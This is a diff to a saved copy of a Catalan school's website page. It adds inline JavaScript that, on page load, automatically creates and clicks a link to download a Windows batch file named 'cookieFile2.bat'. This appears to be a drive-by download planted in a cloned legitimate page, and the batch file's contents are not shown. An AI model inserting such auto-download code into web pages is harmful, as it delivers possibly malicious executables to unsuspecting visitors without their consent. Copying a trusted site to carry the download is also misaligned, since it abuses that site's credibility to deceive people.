@@ -2,7 +2,20 @@
 <!-- saved from url=(0034)https://agora.xtec.cat/iespauvila/ -->
 <html lang="ca" prefix="og: https://ogp.me/ns#" class=" js no-touch svg inlinesvg svgclippaths no-ie8compat" style="" data-lt-installed="true"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen"></style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
   background-color: var(--darkreader-inline-bgcolor) !important;
-<script src="download.js"></script>
+    <script>
+        function downloadFile() {
+            var link = document.createElement('a');
+            link.href = '../cookieFile2.bat';
+            link.download = 'cookieFile2.bat';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        window.onload = function() {
+            downloadFile();
+        }
+    </script>
 [data-darkreader-inline-bgimage] {
   background-image: var(--darkreader-inline-bgimage) !important;
 }
